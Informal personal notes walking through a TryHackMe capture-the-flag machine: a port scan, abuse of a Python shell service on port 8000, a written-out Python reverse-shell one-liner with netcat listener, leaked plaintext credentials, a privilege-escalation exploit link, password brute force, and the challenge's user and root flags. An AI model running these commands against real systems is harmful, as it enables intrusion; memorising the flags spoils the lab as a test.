Note: use incongnito mode always for tryhackme

cache can cause error
maintain the /etc/hosts file
make reports properly
study the working of the tools and understand logic and workflow 
-------------------------------------------------------------------------------
=>nmap scan
	22/tcp		open
	8000/tcp	open
----------------------------------------------username and password by using simple python script------------	
=>nc <machine-ip> 8000
	>>print(os.listdir("/root"))
	Permission denied
	>>print(os.lisdir("/opt/dev/.git/"))

---------------------------------------------------------
[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_

run website on the ingonito
--it does not store cache data

-------------------------------------root flag acess

1) privilage escalation of root received from mail send by the use 
https://github.com/bcoles/local-exploits/blob/master/CVE-2019-18862/exploit.ldpreload.sh 

2) linpeas (Linux privilage escalation awesome scripts)

3) password brute force(when endpoint is discovered)


--------------------------------reverse shell by using python payload-------

terminal 1

└─$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.208.147",4000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' | nc 10.82.185.125 8000    

terminal 2

nc -lvnp 4000

-----------------------In shell(without think access)

/opt/dev/.git (get the username and password of think)

----access user think shell through ssh------------------
get user.txt flag

see any usefull process running inside the root shell
ps aux | grep root

see process running /root/pyrat.py script
root         728  0.0  0.7  21872 14692 ?        S    11:31   0:00 python3 /root/pyrat.py
root        1756  0.0  0.4  13944  9044 ?        Ss   12:21   0:00 sshd: think [priv]


read the script /root/pyrat.py script

---------------------root access

from /root/pyrat.py script we learn about the endpoint admin and it differ from username
it required password

use brute force script
password=abc123

nc <target ip> 8000 
admin
Password abc123

get shell acess

print(open('/root/root.txt', 'r').read())

get root flag
------------------------------------------------------

user flag:
996bdb1f619a68361417cabca5454705

root flag:
ba5ed03e9e74bb98054438480165e221

